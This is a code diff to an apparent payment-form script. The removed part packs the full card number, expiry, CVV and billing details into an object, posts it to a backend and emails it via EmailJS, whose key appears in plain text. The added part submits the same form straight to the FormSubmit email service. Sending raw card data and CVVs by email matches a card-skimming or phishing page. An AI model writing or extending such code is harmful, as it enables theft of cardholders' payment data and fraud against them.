@@ -1,5 +1,4 @@
-// Initialize EmailJS
-emailjs.init('KHhPCXEfp7LC0TknP');
+// FormSubmit handles submission now; old EmailJS/backend email flow removed.
 
 let stateLoadToken = 0;
 
@@ -286,7 +285,8 @@ function setBtn(loading) {
   btn.style.opacity = loading ? '0.7' : '1';
 }
 
-function handleSubmit() {
+async function handleSubmit(event) {
+  if (event) event.preventDefault();
   let valid = true;
 
   const name        = document.getElementById('nameOnCard').value.trim();
@@ -326,56 +326,18 @@ function handleSubmit() {
     showErr('phoneErr', `Invalid phone. Expected ${rule.hint} for this country.`); valid = false;
   } else { clearErr('phoneErr'); }
 
-  if (!valid) return;
+  if (!valid) return false;
 
   const txnId = generateTxnId();
-  const phone = selectedCountryCode + ' ' + phoneVal;
-
-  const templateParams = {
-    transaction_id: txnId,
-    name,
-    card:     document.getElementById('cardNumber').value,
-    month:    expiryMonth,
-    year:     expiryYear,
-    cvv,
-    amount,
-    email,
-    phone:    phone    || 'N/A',
-    address1: addr1    || 'N/A',
-    address2: addr2    || 'N/A',
-    city:     city     || 'N/A',
-    state:    state    || 'N/A',
-    postal:   postal   || 'N/A',
-    country
-  };
+  
+  // Set hidden fields before submission
+  document.getElementById('transactionIdField').value = txnId;
+  document.getElementById('replyToField').value = email;
+  document.getElementById('copyToField').value = email;
 
   setBtn(true);
 
-  const saveToDb = fetch(`${API_BASE}/api/payments`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(templateParams)
-  }).catch(() => ({ ok: false }));
-
-  console.log('Sending email via Nodemailer backend...');
-  const sendEmail = fetch(`${API_BASE}/api/send-email`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(templateParams)
-  })
-    .then((resp) => {
-      if (!resp.ok) throw new Error(`Backend email failed: ${resp.status}`);
-      console.log('Backend email succeeded');
-      return resp.json();
-    })
-    .catch((err) => {
-      console.error('Email sending failed:', err);
-      return null;
-    });
-
-  Promise.allSettled([saveToDb, sendEmail]).then(() => {
-    document.getElementById('txnId').textContent = txnId;
-    document.getElementById('successBox').classList.add('visible');
-    document.getElementById('paymentForm').style.display = 'none';
-  });
+  // Submit directly to FormSubmit from the localhost-served page.
+  document.getElementById('paymentForm').submit();
+  return true;
 }
